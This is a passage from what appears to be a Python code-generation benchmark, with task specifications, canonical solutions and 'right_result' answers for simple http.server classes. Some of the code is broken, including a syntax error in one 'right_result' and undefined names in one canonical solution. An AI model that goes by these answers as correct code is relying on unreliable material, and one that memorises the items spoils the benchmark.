'')\n            if 'gzip' in accept_encoding:\n                headers['Content-Encoding'] = 'gzip'\n                compressed = gzip.compress(file_content)\n                headers['Content-Length'] = str(len(compressed))\n                headers['Content-Type'] = content_type\n                self._respond(headers=headers, data=compressed)\n            else:\n                headers['Content-Length'] = str(len(file_content))\n                self._respond(headers=headers, data=file_content)\n            return\n\n        self.send_error(404, \"File not found\")\n\n    def do_POST(self):\n        parsed_path = urlparse(self.path)\n        path = parsed_path.path\n\n        if path == '/echo':\n            content_length = int(self.headers.get('Content-Length', 0))\n            post_data = self.rfile.read(content_length) if content_length > 0 else b''\n            self._respond(data=post_data)\n            return\n\n        if path == '/post-echo-headers':\n            content_length = int(self.headers.get('Content-Length', 0))\n            self.rfile.read(content_length) if content_length > 0 else b''\n            headers = {k: v for k, v in self.headers.items()}\n            response = json.dumps(headers).encode()\n            self._respond(data=response)\n            return\n\n        if path.startswith('/upload/'):\n            content_length = int(self.headers.get('Content-Length', 0))\n            content = self.rfile.read(content_length) if content_length > 0 else b''\n            filename = path.split('/', 2)[1]\n            self.dynamic_files[filename] = content\n            self._respond(data=f\"Uploaded {filename}\".encode())\n            return\n\n        self.send_error(404, \"Not Found\")\n\n    def read_chunks(self):\n        while True:\n            line = self.rfile.readline()\n            if not line:\n                break\n            chunk_size = int(line.strip(), 16)\n            if chunk_size == 0:\n                break\n            chunk = self.rfile.read(chunk_size)\n            yield chunk\n            self.rfile.read(2)\n\ndef serve():\n    server_address = ('localhost', 0)\n    httpd = HTTPServer(server_address, HTTPTestHandler)\n    host, port = httpd.server_address\n    \n    server_thread = threading.Thread(target=httpd.serve_forever)\n    server_thread.daemon = True\n    \n    try:\n        server_thread.start()\n        yield f\"http://{host}:{port}\"\n    finally:\n        httpd.shutdown()\n        httpd.server_close()\n        server_thread.join()"
  },
  {
    "Task_id": 218,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server for testing purposes, allowing communication between a test suite and a web browser through queues, and handling HTML snippet transmission.\n\nClass Description: The class should implement a custom HTTP server that can receive HTML snippets from a test suite and serve them to a web browser, while also facilitating bidirectional communication between the test suite and server using thread-safe queues.\n\nAttributes:\n\nLOCAL_IP: [str] - The local IP address to bind the server to (default: '127.0.0.1')\nPORT: [int] - The port number to run the server on (default: 28546)\nREQUEST_HANDLER_CLASS: [class] - The custom request handler class to use (default: HTMLSnippetSender)\nto_server_queue: [Queue] - Queue for sending data from test suite to server\nfrom_server_queue: [Queue] - Queue for receiving data from server to test suite\nserver: [HTTPServer] - The HTTP server instance\nserver_thread: [Thread] - Thread running the server\n\nMethods:\n\nsetUpClass: [classmethod]() -> None - Class method to initialize the server and queues before tests\ntearDownClass: [classmethod]() -> None - Class method to clean up server resources after tests\nsend_to_server: [method](value: Any) -> None - Sends data to the server through the input queue\nrecv_from_server: [method](non_blocking: bool = False) -> Any - Receives data from server through output queue (optionally non-blocking)\nopen_url: [method](path: str) -> None - Constructs and opens a URL to the test server in the browser\n\nHTMLSnippetSender Class Description: A custom HTTP request handler that manages HTML snippet transmission between server and browser.\n\nAttributes:\n\nlast_html: [bytes] - Buffer storing the last received HTML snippet\n\nMethods:\n\ndo_GET: [method]() -> None - Handles GET requests, serving the last HTML snippet for root path\nget_last_html: [method]() -> bytes - Retrieves the most recent HTML snippet from the queue\nrecv_from_testsuite: [method](non_blocking: bool = False) -> Any - Receives data from test suite queue (optionally non-blocking)\nsend_to_testsuite: [method](value: Any) -> None - Sends data to test suite through output queue\nlog_request: [method](code: str = '-', size: str = '-') -> None - Overrides default request logging (empty implementation)",
    "Canonical_solution": "from http.server import HTTPServer, BaseHTTPRequestHandler\nfrom queue import Queue\nfrom threading import Thread\nfrom urllib.parse import urlunsplit\n\nclass HTMLSnippetSender(BaseHTTPRequestHandler):\n    last_html = b''\n\n    def get_last_html(self):\n        while True:\n            value = self.recv_from_testsuite(non_blocking=True)\n            if value is None:\n                break\n            self.last_html = value\n        return self.last_html\n\n    def do_GET(self):\n        if self.path == '/':\n            self.send_response(200)\n            self.send_header('Content-Type', 'text/html; charset=utf-8')\n            self.end_headers()\n            self.wfile.write(self.get_last_html().encode('utf-8'))\n        else:\n            self.send_response(404)\n            self.end_headers()\n\n    def recv_from_testsuite(self, non_blocking=False):\n        q = self.server.in_queue\n        if non_blocking:\n            return None if q.empty() else q.get_nowait()\n        return q.get()\n\n    def send_to_testsuite(self, value):\n        self.server.out_queue.put(value)\n\n    def log_request(self, code='-', size='-'):\n        pass\n\nclass BaseBrowserTest:\n    LOCAL_IP = '127.0.0.1'\n    PORT = 28546\n    REQUEST_HANDLER_CLASS = HTMLSnippetSender\n\n    @classmethod\n    def setUpClass(cls):\n        cls.to_server_queue = Queue()\n        cls.from_server_queue = Queue()\n        cls.server = HTTPServer((cls.LOCAL_IP, cls.PORT),\n                              cls.REQUEST_HANDLER_CLASS)\n        cls.server.in_queue = cls.to_server_queue\n        cls.server.out_queue = cls.from_server_queue\n        cls.server_thread = Thread(target=cls.server.serve_forever)\n        cls.server_thread.daemon = True\n        cls.server_thread.start()\n\n    @classmethod\n    def tearDownClass(cls):\n        cls.server.shutdown()\n        cls.server.server_close()\n\n    def send_to_server(self, value):\n        self.to_server_queue.put(value)\n\n    def recv_from_server(self, non_blocking=False):\n        q = self.from_server_queue\n        if non_blocking:\n            return None if q.empty() else q.get_nowait()\n        return q.get()\n\n    def open_url(self, path):\n        self.driver.get(urlunsplit(\n            ('http', '{}:{}'.format(\n                self.LOCAL_IP, self.PORT), path, '', '')))",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "right_result": "import threading\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nfrom queue import Queue, Empty\nfrom urllib.parse import urljoin\nimport webbrowser\n\nclass HTMLSnippetSender(BaseHTTPRequestHandler):\n    last_html = b''\n\n    def do_GET(self):\n        if self.path == '/':\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(self.last_html)\n        else:\n            self.send_error(404, 'File Not Found: %s' % self.path)\n\n    def get_last_html(self):\n        return self.last_html\n\n    def recv_from_testsuite(self, non_blocking=False):\n        try:\n            return self.server.to_server_queue.get(block=not non_blocking)\n        except Empty:\n            return None\n\n    def send_to_testsuite(self, value):\n        self.server.from_server_queue.put(value)\n\n    def log_request(self, code='-', size='-'):\n        pass\n\nclass TestHTTPServer:\n    LOCAL_IP = '127.0.0.1'\n    PORT = 28546\n    REQUEST_HANDLER_CLASS = HTMLSnippetSender\n\n    def __init__(self):\n        self.to_server_queue = Queue()\n        self.from_server_queue = Queue()\n        self.server = None\n        self.server_thread = None\n\n    @classmethod\n    def setUpClass(cls):\n        cls.server = HTTPServer((cls.LOCAL_IP, cls.PORT), cls.REQUEST_HANDLER_CLASS)\n        cls.server.to_server_queue = cls().to_server_queue\n        cls.server.from_server_queue = cls().from_server_queue\n        cls.server_thread = threading.Thread(target=cls.server.serve_forever)\n        cls.server_thread.daemon = True\n        cls.server_thread.start()\n\n    @classmethod\n    def tearDownClass(cls):\n        cls.server.shutdown()\n        cls.server.server_close()\n        cls.server_thread.join()\n\n    def send_to_server(self, value):\n        self.to_server_queue.put(value)\n\n    def recv_from_server(self, non_blocking=False):\n        try:\n            return self.from_server_queue.get(block=not non_blocking)\n        except Empty:\n            return None\n\n    def open_url(self, path='/'):\n        url = urljoin(f'http://{self.LOCAL_IP}:{self.PORT}', path)\n        webbrowser.open(url)"
  },
  {
    "Task_id": 219,
    "Instruction": "Task Description: Create a Python HTTP server that handles POST requests, processes JSON data, and returns a modified JSON response. The server should be implemented using Python's built-in http.server module with customizable port and request handler.\n\nClass Description: The solution consists of two classes: PostHandler (request handler) and HTTPServerWrapper (server manager). PostHandler processes incoming POST requests and their JSON data, while HTTPServerWrapper manages the server lifecycle.\n\nAttributes:\n- port: int - The port number on which the HTTP server will listen (default: 8888)\n- handler_class: class - The request handler class to be used (default: PostHandler)\n- server_address: tuple - A tuple containing the server address and port\n- httpd: HTTPServer - The HTTP server instance\n\nMethods:\n- PostHandler.do_POST() -> None - Handles incoming POST requests, reads JSON data, processes it, and sends back a JSON response\n- PostHandler.process_data(data: dict) -> dict - Processes the incoming JSON data (can be overridden for custom processing)\n- HTTPServerWrapper.__init__(port: int = 8888, handler_class: class = PostHandler) -> None - Initializes the server with specified port and handler\n- HTTPServerWrapper.run() -> None - Starts the HTTP server and begins serving requests indefinitely",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport json\n\nclass PostHandler(BaseHTTPRequestHandler):\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        json_data = json.loads(post_data)\n\n        new_json_data = self.process_data(json_data)\n\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(json.dumps(new_json_data).encode('utf-8'))\n\n    def process_data(self, data):\n        return data\n\nclass HTTPServerWrapper:\n    def __init__(self, port=8888, handler_class=PostHandler):\n        self.port = port\n        self.handler_class = handler_class\n        self.server_address = ('', self.port)\n        self.httpd = HTTPServer(self.server_address, self.handler_class)\n\n    def run(self):\n        print('Starting httpd on port {}'.format(self.port))\n        self.httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "right_result": "import json\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass PostHandler(BaseHTTPRequestHandler):\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        data = json.loads(post_data.decode('utf-8'))\n        \n        processed_data = self.process_data(data)\n        \n        response = json.dumps(processed_data).encode('utf-8')\n        \n        self.send_response(200)\n        self.send_header('Content-Type', 'application/json')\n        self.end_headers()\n        self.wfile.write(response)\n\n    def process_data(self, data):\n        return {\"received\": data}\n\nclass HTTPServerWrapper:\n    def __init__(self, port=8888, handler_class=PostHandler):\n        self.port = port\n        self.handler_class = handler_class\n        self.server_address = ('', self.port)\n        self.httpd = HTTPServer(self.server_address, self.handler_class)\n\n    def run(self):\n        print(f'Starting server on port {self.port}...')\n        self.httpd.serve_forever()"
  },
  {
    "Task_id": 221,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server capable of handling POST requests to receive and process file uploads with metadata, then store the files locally and register them via an API.\n\nClass Description: HTTPPostHandler is a class that sets up an HTTP server to handle file uploads via POST requests. It processes JSON payloads containing file data (base64 encoded), metadata, and stores the decoded files in a specified directory while registering them through an external API.\n\nAttributes:\n- OUTPUT_DIR: str - The base directory where uploaded files will be stored\n- port: int - The port number on which the HTTP server will listen\n\nMethods:\n- __init__(output_dir: str = '', port: int = 80) -> None - Initializes the HTTPPostHandler with optional output directory and port parameters\n- run() -> None - Starts the HTTP server and begins listening for requests indefinitely\n\nNested Class: Handler (extends BaseHTTPRequestHandler)\nMethods:\n- _set_headers() -> None - Sets the HTTP response headers for successful requests\n- do_POST() -> None - Handles POST requests, processes the incoming file data and metadata, saves the file to disk, and registers it via API",
    "Canonical_solution": "import os\nimport sys\nimport json\nimport string\nimport random\nimport base64\nimport requests\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass HTTPPostHandler:\n    def __init__(self, output_dir='', port=80):\n        self.OUTPUT_DIR = output_dir\n        self.port = port\n\n    class Handler(BaseHTTPRequestHandler):\n        def _set_headers(self):\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n\n        def do_POST(self):\n            self._set_headers()\n            self.data_string = self.rfile.read(int(self.headers['Content-Length']))\n            self.send_response(200)\n            self.end_headers()\n\n            json_data = json.loads(self.data_string)\n            b64_data = json_data.get('data')\n            filetype = json_data.get('type')\n            owner = json_data.get('owner')\n            module = json_data.get('module')\n            session = json_data.get('session')\n            filename = json_data.get('filename')\n\n            data = base64.b64decode(b64_data)\n            if session.startswith('_b64'):\n                session = base64.b64decode(session[6:]).decode('ascii')\n\n            if not filetype.startswith('.'):\n                filetype = '.' + filetype\n\n            if not filename:\n                filename = str().join([random.choice(string.ascii_lowercase + string.digits) for _ in range(3)]) + filetype\n\n            output_path = os.path.join(self.OUTPUT_DIR, owner, 'files', filename)\n\n            requests.post(\"http://0.0.0.0/api/file/add\", {\"filename\": filename, \"owner\": owner, \"module\": module, \"session\": session})\n\n            with open(output_path, 'wb') as fp:\n                fp.write(data)\n\n    def run(self):\n        httpd = HTTPServer(('0.0.0.0', self.port), self.Handler)\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "right_result": "import os\nimport json\nimport base64\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom urllib import request as url_request\n\nclass HTTPPostHandler:\n    OUTPUT_DIR = ''\n    port = 80\n\n    def __init__(self, output_dir: str = '', port: int = 80) -> None:\n        self.OUTPUT_DIR = output_dir\n        self.port = port\n\n    class Handler(BaseHTTPRequestHandler):\n        def _set_headers(self) -> None:\n            self.send_response(200)\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n\n        def do_POST(self) -> None:\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length)\n            data = json.loads(post_data)\n\n            file_name = data.get('filename')\n            file_data_b64 = data.get('file_data')\n            metadata = data.get('metadata', {})\n\n            if not file_name or not file_data_b64:\n                self.send_response(400)\n                self.send_header('Content-type', 'application/json')\n                self.end_headers()\n                self.wfile.write(json.dumps({'error': 'Missing filename or file_data'}).encode())\n                return\n\n            try:\n                file_data = base64.b64decode(file_data_b64)\n            except Exception as e:\n                self.send_response(400)\n                self.send_header('Content-type', 'application/json')\n                self.end_headers()\n                self.wfile.write(json.dumps({'error': 'Failed to decode file data'}).encode())\n                return\n\n            output_dir = self.server.OUTPUT_DIR\n            if not os.path.exists(output_dir):\n                os.makedirs(output_dir)\n\n            file_path = os.path.join(output_dir, file_name)\n            with open(file_path, 'wb') as f:\n                f.write(file_data)\n\n            api_url = metadata.get('registration_api_url')\n            if api_url:\n                try:\n                    req_data = json.dumps({\n                        'filename': file_name,\n                        'path': file_path,\n                        'metadata': metadata\n                    }).encode()\n                    req = url_request.Request(api_url, data=req_data, headers={'Content-Type': 'application/json'})\n                    resp = url_request.urlopen(req)\n                    registration_status = resp.status\n                except Exception as e:\n                    registration_status = str(e)\n            else:\n                registration_status = 'No registration API provided'\n\n            response = {\n                'message': 'File processed successfully',\n                'file_saved_at': file_path,\n                'registration_status': registration_status\n            }\n\n            self._set_headers()\n            self.wfile.write(json.dumps(response).encode())\n\n    def run(self) -> None:\n        server_address = ('', self.port)\n        httpd = HTTPServer(server_address, self.Handler)\n        httpd.OUTPUT_DIR = self.OUTPUT_DIR\n        print(f'Starting HTTP server on port {self.port}...')\n        httpd.serve_forever()"
  },
  {
    "Task_id": 223,
    "Instruction": "Task Description: Create a Python class that implements a simple HTTP server to serve static files (CSS, JavaScript, and images) with proper content types and error handling.\n\nClass Description: PVEDiscordDarkServer is a class that creates an HTTP server to serve static web resources including CSS files, JavaScript files, and various image formats (PNG, JPG, JPEG, SVG). It handles different file types with appropriate content headers and provides error responses for missing files or unsupported requests.\n\nAttributes:\nPORT: int - The port number on which the HTTP server will run\nDIR_SASS: str - The directory path containing CSS files\nDIR_IMAGES: str - The directory path containing image files\nDIR_JS: str - The directory path containing JavaScript files\n\nMethods:\n__init__(port=3000) -> None - Initializes the server with the specified port (default: 3000) and sets up directory paths for static files\nrun() -> None - Starts the HTTP server and begins serving requests indefinitely until interrupted\nRequestHandler: class - Inner class that handles HTTP requests (inherits from BaseHTTPRequestHandler)\n    __init__(*args, **kwargs) -> None - Initializes the request handler with directory paths\n    log_message(format, *args) -> None - Overrides default logging to suppress log messages\n    _set_headers(status, type) -> None - Helper method to set HTTP response headers\n    do_GET() -> None - Handles GET requests, serves appropriate files with correct content types, or returns error responses",
    "Canonical_solution": "from http.server import HTTPServer, BaseHTTPRequestHandler\nimport json\nimport os\n\nclass PVEDiscordDarkServer:\n    def __init__(self, port=3000):\n        self.PORT = port\n        self.DIR_SASS = os.path.join(os.path.dirname(__file__), \"sass\")\n        self.DIR_IMAGES = os.path.join(os.path.dirname(__file__), \"images\")\n        self.DIR_JS = os.path.join(os.path.dirname(__file__), \"js\")\n\n    class RequestHandler(BaseHTTPRequestHandler):\n        def __init__(self, *args, **kwargs):\n            self.DIR_SASS = kwargs.pop('DIR_SASS')\n            self.DIR_IMAGES = kwargs.pop('DIR_IMAGES')\n            self.DIR_JS = kwargs.pop('DIR_JS')\n            super().__init__(*args, **kwargs)\n\n        def log_message(self, format, *args):\n            return\n\n        def _set_headers(self, status, type):\n            self.send_response(status)\n            self.send_header(\"Content-type\", type)\n            self.end_headers()\n\n        def do_GET(self):\n            status = 200\n            type = \"application/json\"\n            data = None\n\n            file = self.path.rpartition(\"/\")[2]\n            ext = file.rpartition(\".\")[2]\n\n            if ext == \"css\":\n                data = open(os.path.join(self.DIR_SASS, \"PVEDiscordDark.css\"), \"rb\").read()\n                type = \"text/css\"\n            elif ext == \"js\":\n                data = open(os.path.join(self.DIR_JS, \"PVEDiscordDark.js\"), \"rb\").read()\n                type = \"application/javascript\"\n            elif ext in (\"png\", \"jpg\", \"jpeg\"):\n                try:\n                    data = open(os.path.join(self.DIR_IMAGES, file), \"rb\").read()\n                    type = f\"image/{ext}\"\n                except FileNotFoundError:\n                    status = 404\n            elif ext == \"svg\":\n                try:\n                    data = open(os.path.join(self.DIR_IMAGES, file), \"rb\").read()\n                    type = f\"image/svg+xml\"\n                except FileNotFoundError:\n                    status = 404\n            else:\n                status = 400\n            self._set_headers(status, type)\n            if status == 200:\n                self.wfile.write(data)\n            else:\n                self.wfile.write(json.dumps({\"error\": status}).encode())\n\n    def run(self):\n        print(f\"Serving on localhost:{self.PORT}\")\n        server = HTTPServer(\n            server_address=(\"\", self.PORT),\n            RequestHandlerClass=lambda *args, **kwargs: self.RequestHandler(\n                *args,\n                DIR_SASS=self.DIR_SASS,\n                DIR_IMAGES=self.DIR_IMAGES,\n                DIR_JS=self.DIR_JS,\n                **kwargs\n            )\n        )\n        try:\n            server.serve_forever()\n        except KeyboardInterrupt:\n            quit()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "right_result": "import os\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom urllib.parse import urlparse\n\nclass PVEDiscordDarkServer:\n    PORT = 3000\n    DIR_SASS = \"static/css\"\n    DIR_IMAGES = \"static/images\"\n    DIR_JS = \"static/js\"\n\n    def __init__(self, port=3000):\n        self.PORT = port\n        self.DIR_SASS = os.path.join(os.getcwd(), 'static', 'css')\n        self.DIR_IMAGES = os.path.join(os.getcwd(), 'static', 'images')\n        self.DIR_JS = os.path.join(os.getcwd(), 'static', 'js')\n\n    class RequestHandler(BaseHTTPRequestHandler):\n        def __init__(self, *args, dir_sass=None, dir_images=None, dir_js=None, **kwargs):\n            self.dir_sass = dir_sass\n            self.dir_images = dir_images\n            self.dir_js = dir_js\n            super().__init__(*args, **kwargs)\n\n        def log_message(self, format, *args):\n            return\n\n        def _set_headers(self, status=200, content_type='text/html'):\n            self.send_response(status)\n            self.send_header('Content-type', content_type)\n            self.end_headers()\n\n        def do_GET(self):\n            parsed_path = urlparse(self.path)\n            path = parsed_path.path\n\n            if path.startswith('/css/'):\n                file_path = os.path.join(self.dir_sass, path[4:])\n                content_type = 'text/css'\n            elif path.startswith('/js/'):\n                file_path = os.path.join(self.dir_js, path[3:])\n                content_type = 'application/javascript'\n            elif path.startswith('/images/'):\n                file_path = os.path.join(self.dir_images, path[7:])\n                ext = os.path.splitext(file_path)[1].lower()\n                content_type_map = {\n                    '.png': 'image/png',\n                    '.jpg': 'image/jpeg',\n                    '.jpeg': 'image/jpeg',\n                    '.svg': 'image/svg+xml'\n                }\n                content_type = content_type_map.get(ext, 'application/octet-stream')\n            else:\n                self._set_headers(403, 'text/plain')\n                self.wfile.write(b'Forbidden: Access to this resource is denied.')\n                return\n\n            try:\n                with open(file_path, 'rb') as file:\n                    content = file.read()\n                self._set_headers(200, content_type)\n                self.wfile.write(content)\n            except FileNotFoundError:\n                self._set_headers(404, 'text/plain')\n                self.wfile.write(b'404 Not Found: The requested file was not found.')\n            except Exception as e:\n                self._set_headers(500, 'text/plain')\n                self.wfile.write(f'500 Internal Server Error: {str(e)}'.encode())\n\n    def run(self):\n        server_address = ('', self.PORT)\n        httpd = HTTPServer(server_address, lambda *args, **kwargs: self.RequestHandler(*args,\n                                                                                     dir_sass=self.DIR_SASS,\n                                                                                     dir_images=self.DIR_IMAGES,\n                                                                                     dir_js=self.DIR_JS,\n                                                                                     **kwargs))\n        print(f'Starting server on port {self.PORT}...')\n        try:\n            httpd.serve_forever()\n        except KeyboardInterrupt:\n            pass\n        finally:\n            print('\\nStopping server.')\n            httpd.server_close()"
  },
  {
    "Task_id": 226,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server for resolving secret hashes to their corresponding secrets, specifically designed for XUD (Cross-chain Unidirectional Payment Channel) resolution.\n\nClass Description: The XUDResolver class is an HTTP server that handles POST requests containing secret hashes and responds with the corresponding secret if the hash matches a predefined secret. It uses Python's http.server module to create a simple HTTP server.\n\nAttributes:\n- host: str - The host address where the server will run (default: \"localhost\")\n- port: int - The port number for the server (default: 8000)\n- x_secret: str - A predefined secret in hexadecimal format\n- x_secret_hash: str - The SHA-256 hash of the predefined secret\n\nMethods:\n- __init__(host: str = \"localhost\", port: int = 8000) -> None - Initializes the XUDResolver with optional host and port parameters\n- resolve(request: dict) -> dict or None - Takes a request dictionary containing a \"secrethash\" and returns the corresponding secret if the hash matches, otherwise returns None\n- serve() -> None - Starts the HTTP server with a custom request handler that processes POST requests for secret resolution",
    "Canonical_solution": "import json\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom hashlib import sha256\nfrom eth_utils import to_bytes, to_hex\n\nclass XUDResolver:\n    def __init__(self, host=\"localhost\", port=8000):\n        self.host = host\n        self.port = port\n        self.x_secret = \"0x2ff886d47b156de00d4cad5d8c332706692b5b572adfe35e6d2f65e92906806e\"\n        self.x_secret_hash = to_hex(sha256(to_bytes(hexstr=self.x_secret)).digest())\n\n    def resolve(self, request):\n        if \"secrethash\" not in request:\n            return None\n\n        if request[\"secrethash\"] == self.x_secret_hash:\n            return {\"secret\": self.x_secret}\n        return None\n\n    def serve(self):\n        class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):\n            def __init__(self, *args, **kwargs):\n                self.resolver = kwargs.pop('resolver')\n                super().__init__(*args, **kwargs)\n\n            def do_POST(self):\n                try:\n                    content_len = int(self.headers.get(\"Content-Length\"))\n                    body = self.rfile.read(content_len)\n\n                    preimage = self.resolver.resolve(json.loads(body.decode(\"utf8\")))\n                    if preimage is None:\n                        self.send_response(404)\n                        self.end_headers()\n                    else:\n                        response = to_bytes(text=json.dumps(preimage))\n                        self.send_response(200)\n                        self.end_headers()\n                        self.wfile.write(response)\n                except BaseException:\n                    self.send_response(400)\n                    self.end_headers()\n\n        httpd = HTTPServer((self.host, self.port), lambda *args, **kwargs: SimpleHTTPRequestHandler(*args, resolver=self, **kwargs))\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "right_result": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport json\nimport hashlib\n\nclass XUDResolver:\n    def __init__(self, host=\"localhost\", port=8000):\n        self.host = host\n        self.port = port\n        self.x_secret = \"0x123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0\"\n        self.x_secret_hash = hashlib.sha256(bytes.fromhex(self.x_secret[2:])).hexdigest()\n\n    def resolve(self, request):\n        if request.get(\"secrethash\") == self.x_secret_hash:\n            return {\"secret\": self.x_secret}\n        return None\n\n    class RequestHandler(BaseHTTPRequestHandler):\n        def do_POST(self):\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length)\n            request = json.loads(post_data)\n\n            resolver = self.server.resolver\n            response = resolver.resolve(request)\n\n            self.send_response(200 if response else 404)\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n            self.wfile.write(json.dumps(response).encode() if response else b'{\"error\": \"Secret not found\"}')\n\n    def serve(self):\n        server_address = (self.host, self.port)\n        httpd = HTTPServer(server_address, self.RequestHandler)\n        httpd.resolver = self\n        print(f\"Serving on {self.host}:{self.port}\")\n        httpd.serve_forever()"
  },
  {
    "Task_id": 228,
    "Instruction": "Task Description: Create a custom HTTP server in Python that can serve content and be stopped after handling a single GET request.\n\nClass Description: This implementation consists of two classes: HttpRequestHandler (handles HTTP requests) and HttpServer (manages server operations). The server serves specified content when receiving a GET request and then stops itself.\n\nAttributes:\n\nAttribute1: stop [bool] - Flag indicating whether the server should stop running\nAttribute2: content [bytes] - The content to be served in response to GET requests\n\nMethods:\n\nMethod1: do_GET(self) -> None - Handles GET requests by sending a 200 response with the server's content and setting the stop flag\nMethod2: log_message(self, format, *args) -> None - Overrides default logging to suppress log messages\nMethod3: serve_forever(self, content) -> None - Starts the server with the given content and runs until a request is handled (stop flag is set)",
    "Canonical_solution": "import socket\nimport threading\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass HttpRequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"text/html\")\n        self.end_headers()\n        self.wfile.write(self.server.content)\n        self.server.stop = True\n\n    def log_message(self, format, *args):\n        return\n\nclass HttpServer(HTTPServer):\n    def serve_forever(self, content):\n        self.stop = False\n        self.content = content\n        while not self.stop:\n            self.handle_request()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "right_result": "from http.server import HTTPServer, BaseHTTPRequestHandler\n\nclass HttpRequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(self.server.content)\n        self.server.stop = True\n\n    def log_message(self, format, *args):\n        pass\n\nclass HttpServer(HTTPServer):\n    def __init__(self, server_address):\n        super().__init__(server_address, HttpRequestHandler)\n        self.stop = False\n        self.content = b''\n\n    def serve_forever(self, content):\n        self.content = content\n        while not self.stop:\n            self.handle_request()"
  },
  {
    "Task_id": 231,
    "Instruction": "Task Description: Implement a Python HTTP server using the http.server module to handle GET and POST requests, track request counts, and manage server lifecycle.\n\nClass Description: The implementation consists of two classes: RequestHandler (for handling HTTP requests) and HTTPServerManager (for server management).\n\nAttributes:\n\nhits: ClassVar[dict[str, int]] - Class-level dictionary to track counts of different HTTP methods received\nport: int - The port number on which the server will listen (in HTTPServerManager)\nserver: HTTPServer - The HTTP server instance (in HTTPServerManager)\n\nMethods:\n\nRequestHandler:\nlog_message: (format: str, *args: Any) -> None - Overrides default logging to also output request body data when present\ndo_POST: () -> None - Handles POST requests, increments POST counter, and sends 200 response\ndo_GET: () -> None - Handles GET requests, increments GET counter, sends 200 response with JSON content type\n\nHTTPServerManager:\n__init__: (port: int = 0) -> None - Initializes the server with specified port (0 for random port)\nserve_forever: () -> None - Starts the server to handle requests indefinitely\nshutdown: () -> None - Shuts down the server gracefully",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nfrom collections import defaultdict\nfrom typing import ClassVar\nimport json\n\nclass RequestHandler(BaseHTTPRequestHandler):\n    hits: ClassVar[dict[str, int]] = defaultdict(int)\n\n    def log_message(self, format, *args) -> None:  # noqa: A002\n        super().log_message(format, *args)\n        if length := self.headers.get(\"Content-Length\"):\n            data = self.rfile.read(int(length)).decode(\"utf8\")\n            sys.stderr.write(f\"{data}\\n\")\n\n    def do_POST(self):  # noqa: N802\n        self.hits[\"POST\"] += 1\n        self.send_response(200)\n        super().end_headers()\n\n    def do_GET(self):  # noqa: N802\n        self.hits[\"GET\"] += 1\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(UPDATER_INFO_STR)\n\nclass HTTPServerManager:\n    def __init__(self, port: int = 0):\n        self.port = port\n        self.server = HTTPServer((\"localhost\", port), RequestHandler)\n\n    def serve_forever(self):\n        self.server.serve_forever()\n\n    def shutdown(self):\n        self.server.shutdown()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "right_result": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport json\nimport logging\nimport socket\n\nclass RequestHandler(BaseHTTPRequestHandler):\n    hits: dict[str, int] = {'GET': 0, 'POST': 0]\n\n    def log_message(self, format: str, *args: any) -> None:\n        try:\n            content_length = int(self.headers.get('Content-Length', 0))\n            body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else ''\n            extra_info = f' | Body: {body}' if body else ''\n        except Exception as e:\n            extra_info = f' | Error reading body: {e}'\n        finally:\n            super().log_message(format + extra_info)\n            self.rfile.seek(0)\n\n    def do_GET(self) -> None:\n        RequestHandler.hits['GET'] += 1\n        self.send_response(200)\n        self.send_header('Content-type', 'application/json')\n        self.end_headers()\n        response = json.dumps({\"message\": \"GET request received\", \"hits\": RequestHandler.hits})\n        self.wfile.write(response.encode())\n\n    def do_POST(self) -> None:\n        try:\n            content_length = int(self.headers.get('Content-Length', 0))\n            post_data = self.rfile.read(content_length) if content_length > 0 else b''\n            RequestHandler.hits['POST'] += 1\n            self.send_response(200)\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n            response = json.dumps({\n                \"message\": \"POST request received\",\n                \"hits\": RequestHandler.hits,\n                \"received_data\": post_data.decode() if post_data else \"\"\n            })\n            self.wfile.write(response.encode())\n        except Exception as e:\n            self.send_error(500, f\"Internal Server Error: {e}\")\n\nclass HTTPServerManager:\n    def __init__(self, port: int = 0) -> None:\n        self.port = port\n        self.server = HTTPServer(('localhost', self.port), RequestHandler)\n\n    def serve_forever(self) -> None:\n        logging.info(f'Starting server on port 